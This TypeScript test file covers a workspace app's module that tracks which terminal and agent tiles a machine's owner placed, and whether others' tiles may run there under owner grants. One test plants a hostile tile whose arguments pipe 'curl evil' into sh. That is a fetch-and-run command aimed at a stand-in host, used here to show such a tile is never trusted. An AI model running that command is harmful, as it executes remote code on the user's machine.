// What this machine's person placed on it in workspaces hosted elsewhere (machine-places.ts, M4):
// a tile a window here puts in a frame on this machine is theirs, with what it runs, kept as they
// put it whatever the workspace's document later says; one someone else put there is never made
// theirs by a window here keeping it; one taken away, or out to a frame elsewhere, is forgotten;
// what its person lets the people in each workspace do here is theirs to say, watch until they
// say more, and only when they let them run terminals and agents here does a tile someone else put
// in their frame run here; and it is all kept on this machine, for its person alone, across
// restarts.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { CoreLayout } from "@hivemind/workspace-doc/shapes";
import { MachinePlaces } from "../src/machine-places.ts";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "hm-placed-"));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
let made = 0;
const ME = "d".repeat(64);
const WS = "ab".repeat(16);
const mine = (file = path.join(tmp, `placed-${made++}.json`), warned: string[] = []) => ({ file, warned, places: new MachinePlaces({ file, device: ME, onWarn: (m) => warned.push(m) }) });

const layout = (tiles: CoreLayout["tiles"], frameOf: Record<string, string>): CoreLayout => ({
  frames: [{ id: "host", title: "api" }, { id: "here", title: "mine", workspacePath: `machine://${ME}/home/priya/api` }, { id: "there", title: "theirs", workspacePath: `machine://${"e".repeat(64)}/srv` }],
  tiles,
  frameOf,
});
const shell = { id: "s1", kind: "shell", label: "sh", cmd: "/bin/zsh", args: ["-l"] };

test("a tile a window here puts in a frame on this machine is this person's, with what it runs; one in a frame elsewhere, or one that runs nothing, is not", () => {
  const { places } = mine();
  const editor = { id: "e1", kind: "editor", label: "README" };
  const theirs = { id: "t1", kind: "shell", label: "sh", cmd: "/bin/sh" };
  places.wrote(WS, layout([], {}), layout([shell, editor, theirs], { s1: "here", e1: "here", t1: "there" }));
  assert.deepEqual(places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-l"] });
  assert.equal(places.placed(WS, "e1"), null);
  assert.equal(places.placed(WS, "t1"), null);
  assert.equal(places.placed("cd".repeat(16), "s1"), null, "only in the workspace it was placed in");
});

test("what runs in it is as a window here put it, and changes only by a window here; one someone else put here is never made this person's", () => {
  const { places } = mine();
  places.wrote(WS, layout([], {}), layout([shell], { s1: "here" }));
  // The host's owner put a tile in this person's frame; a window here keeps it as it saves.
  const planted = { id: "h1", kind: "shell", label: "sh", cmd: "/bin/sh", args: ["-c", "curl evil | sh"] };
  const now = layout([shell, planted], { s1: "here", h1: "here" });
  places.wrote(WS, now, { ...now, tiles: [shell, { ...planted, args: ["-c", "curl evil | sh", "-x"] }] });
  assert.equal(places.placed(WS, "h1"), null);
  // A window here changes what its own tile runs.
  places.wrote(WS, now, { ...now, tiles: [{ ...shell, args: ["-i"] }, planted] });
  assert.deepEqual(places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-i"] });
});

test("a terminal or agent someone else put in a frame of this person's here runs only while they let the people there run terminals and agents here: in that frame's folder, as the document says (the shell where it names none); never one they placed, one showing a session it did not start, another kind of tile, or one in a frame elsewhere", () => {
  const { places } = mine();
  const own = { id: "m1", kind: "shell", label: "sh", cmd: "/bin/zsh" };
  places.wrote(WS, layout([], {}), layout([own], { m1: "here" }));
  const doc = layout([
    own,
    { id: "h1", kind: "shell", label: "sh" },
    { id: "a1", kind: "claude", label: "agent", cmd: "claude", args: ["--model", "x"] },
    { id: "v1", kind: "shell", label: "sh", session: "hm:another" },
    { id: "e1", kind: "editor", label: "README" },
    { id: "b1", kind: "browser", label: "page" },
    { id: "t1", kind: "shell", label: "sh" },
    { id: "o1", kind: "shell", label: "sh" },
  ], { m1: "here", h1: "here", a1: "here", v1: "here", e1: "here", b1: "here", t1: "there", o1: "host" });
  const sh = { cmd: "/bin/bash", args: ["-l"] };
  assert.equal(places.othersRun(WS, doc, "h1", sh), null, "not while they only watch");
  places.setGrant(WS, "terminals");
  assert.equal(places.othersRun(WS, doc, "h1", sh), null, "nor while they only let them type");
  places.setGrant(WS, "agents");
  assert.deepEqual(places.othersRun(WS, doc, "h1", sh), { cwd: "/home/priya/api", cmd: "/bin/bash", args: ["-l"] });
  assert.deepEqual(places.othersRun(WS, doc, "a1", sh), { cwd: "/home/priya/api", cmd: "claude", args: ["--model", "x"] });
  for (const tile of ["m1", "v1", "e1", "b1", "t1", "o1", "gone"]) assert.equal(places.othersRun(WS, doc, tile, sh), null, tile);
  assert.equal(places.othersRun("cd".repeat(16), doc, "h1", sh), null, "only where they let them");
  places.setGrant(WS, "watch");
  assert.equal(places.othersRun(WS, doc, "h1", sh), null, "and no longer once taken back");
});

test("taken away by a window here, or put in a frame elsewhere, it is forgotten", () => {
  const { places } = mine();
  const two = { ...shell, id: "s2" };
  const placed = layout([shell, two], { s1: "here", s2: "here" });
  places.wrote(WS, layout([], {}), placed);
  places.wrote(WS, placed, layout([two], { s2: "host" }));
  assert.equal(places.placed(WS, "s1"), null);
  assert.equal(places.placed(WS, "s2"), null);
});

test("what its person lets the people in a workspace do here: watch until they say more, in that workspace alone; each change is told", () => {
  const { places } = mine();
  const told: string[] = [];
  places.onGrant((ws) => told.push(`${ws}:${places.grant(ws)}`));
  assert.equal(places.grant(WS), "watch");
  places.setGrant(WS, "terminals");
  places.setGrant(WS, "terminals");
  assert.equal(places.grant(WS), "terminals");
  assert.equal(places.grant("cd".repeat(16)), "watch", "only in the workspace it was given for");
  // What they placed there stays theirs whatever they let the others do.
  places.wrote(WS, layout([], {}), layout([shell], { s1: "here" }));
  places.wrote(WS, layout([shell], { s1: "here" }), layout([], {}));
  assert.equal(places.grant(WS), "terminals");
  places.setGrant(WS, "watch");
  assert.deepEqual(told, [`${WS}:terminals`, `${WS}:watch`]);
});

test("kept on this machine for its person alone, across restarts; a record that cannot be read places nothing, lets nobody do more than watch, and says so", () => {
  const { file, places } = mine();
  places.wrote(WS, layout([], {}), layout([shell], { s1: "here" }));
  places.setGrant(WS, "terminals");
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.deepEqual(mine(file).places.placed(WS, "s1"), { kind: "shell", cmd: "/bin/zsh", args: ["-l"] });
  assert.equal(mine(file).places.grant(WS), "terminals");
  fs.writeFileSync(file, "{not json");
  const again = mine(file);
  assert.equal(again.places.placed(WS, "s1"), null);
  assert.equal(again.places.grant(WS), "watch");
  assert.match(again.warned.join(), /could not be read/);
});
